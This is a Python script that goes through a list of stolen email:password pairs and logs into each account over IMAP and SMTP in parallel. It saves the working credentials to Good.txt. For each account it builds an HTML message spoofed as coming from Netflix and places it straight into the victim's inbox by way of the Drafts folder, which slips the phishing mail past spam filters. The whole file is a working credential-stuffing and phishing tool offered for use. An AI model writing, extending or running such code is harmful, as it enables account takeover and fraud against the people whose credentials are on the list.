import imaplib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import dns.resolver
from multiprocessing import Pool, Manager
import os
import logging

# Configure logging
logging.basicConfig(filename='email_processing.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Predefined IMAP server list for common email providers
PREDEFINED_IMAP_SERVERS = {
    'gmail.com': 'imap.gmail.com',
    'yahoo.com': 'imap.mail.yahoo.com',
    'outlook.com': 'imap-mail.outlook.com',
    'hotmail.com': 'imap-mail.outlook.com',
    'icloud.com': 'imap.mail.me.com',
    'me.com': 'imap.mail.me.com',
    'aol.com': 'imap.aol.com',
    'zoho.com': 'imap.zoho.com',
    'gmx.com': 'imap.gmx.com',
    'yandex.com': 'imap.yandex.com',
    'iprimus.com.au': 'imap.iprimus.com.au',
    # Add more predefined mappings as needed
}

# Cache for IMAP servers
IMAP_SERVER_CACHE = {}

# Function to detect IMAP server based on email domain using DNS lookup and predefined servers
def get_imap_server(email):
    domain = email.split('@')[1]

    # Check cache first
    if domain in IMAP_SERVER_CACHE:
        return IMAP_SERVER_CACHE[domain]

    # Check predefined list
    if domain in PREDEFINED_IMAP_SERVERS:
        imap_server = PREDEFINED_IMAP_SERVERS[domain]
        IMAP_SERVER_CACHE[domain] = imap_server
        return imap_server

    try:
        # Attempt to fetch MX records
        mx_records = dns.resolver.resolve(domain, 'MX')
        mx_record = str(mx_records[0].exchange).strip('.')

        # Common patterns to try for IMAP server
        possible_imap_servers = [
            'imap.' + domain,
            'mail.' + domain,
            'imap.' + '.'.join(mx_record.split('.')[1:]),
            'mail.' + '.'.join(mx_record.split('.')[1:])
        ]

        for imap_server in possible_imap_servers:
            try:
                # Try to connect to the IMAP server to check if it is valid
                imaplib.IMAP4_SSL(imap_server)
                IMAP_SERVER_CACHE[domain] = imap_server
                return imap_server
            except Exception:
                continue

    except Exception as e:
        logging.error(f"Failed to get IMAP server for {domain}: {str(e)}")
        return None

    return None

# Read email-password combinations from DATA1.txt
def read_email_combos(file_name):
    with open(file_name, 'r') as file:
        lines = file.readlines()
    email_combos = []
    for line in lines:
        parts = line.strip().split(':')
        if len(parts) == 2:
            email_combos.append(tuple(parts))
        else:
            logging.warning(f"Invalid format in line: {line.strip()}")
    return email_combos

# Read the HTML content from Newsletter.txt
def read_newsletter(file_name):
    with open(file_name, 'r') as file:
        return file.read()

# Process a single email
def process_email(email_combo, newsletter_content, good_emails):
    email_addr, password = email_combo
    try:
        # Detect IMAP server
        imap_server_address = get_imap_server(email_addr)
        if not imap_server_address:
            logging.error(f"IMAP server not found for {email_addr}")
            return

        # Connect to IMAP server
        imap_server = imaplib.IMAP4_SSL(imap_server_address)
        imap_server.login(email_addr, password)

        # Detect SMTP server
        smtp_server_address = get_smtp_server(email_addr)
        if not smtp_server_address:
            logging.error(f"SMTP server not found for {email_addr}")
            return

        # Connect to SMTP server
        smtp_server = smtplib.SMTP(smtp_server_address, 587)
        smtp_server.starttls()
        smtp_server.login(email_addr, password)

        # Create the email content
        msg = MIMEMultipart()
        msg['From'] = "< Netflix contact@netflix.com >"
        msg['To'] = email_addr  # Sending to self
        msg['Subject'] = "Netflix Team"
        msg.attach(MIMEText(newsletter_content, 'html'))

        # Save email as draft
        raw_msg = msg.as_string()
        imap_server.append('Drafts', '\\Draft', imaplib.Time2Internaldate(time.time()), raw_msg.encode('utf-8'))

        # Move the draft email to Inbox
        imap_server.select('Drafts')
        status, data = imap_server.search(None, 'ALL')
        draft_id = data[0].split()[-1]
        imap_server.copy(draft_id, 'INBOX')
        imap_server.store(draft_id, '+FLAGS', '\\Deleted')
        imap_server.expunge()

        logging.info(f"Email processed for: {email_addr}")
        good_emails.append((email_addr, password))

    except imaplib.IMAP4.error as e:
        logging.error(f"IMAP Authentication failed for {email_addr}: {str(e)}")
    except smtplib.SMTPAuthenticationError as e:
        logging.error(f"SMTP Authentication failed for {email_addr}: {str(e)}")
    except Exception as e:
        logging.error(f"Failed to process email for {email_addr}: {str(e)}")

    finally:
        try:
            imap_server.logout()
            smtp_server.quit()
        except:
            pass

# Detect SMTP server based on MX records
def get_smtp_server(email):
    domain = email.split('@')[1]
    try:
        mx_records = dns.resolver.resolve(domain, 'MX')
        mx_record = str(mx_records[0].exchange).strip('.')
        smtp_server = 'smtp.' + domain if 'smtp.' + domain else mx_record
        return smtp_server
    except Exception as e:
        logging.error(f"Failed to get SMTP server for {domain}: {str(e)}")
        return None

# Main function to process all emails
def main():
    email_combos = read_email_combos('DATA1.txt')
    newsletter_content = read_newsletter('Newsletter.txt')
    manager = Manager()
    good_emails = manager.list()

    with Pool(processes=10) as pool:
        pool.starmap(process_email, [(combo, newsletter_content, good_emails) for combo in email_combos])

    # Save successfully connected emails and passwords to Good.txt
    with open('Good.txt', 'w') as file:
        for email, password in good_emails:
            file.write(f"{email},{password}\n")

if __name__ == '__main__':
    main()
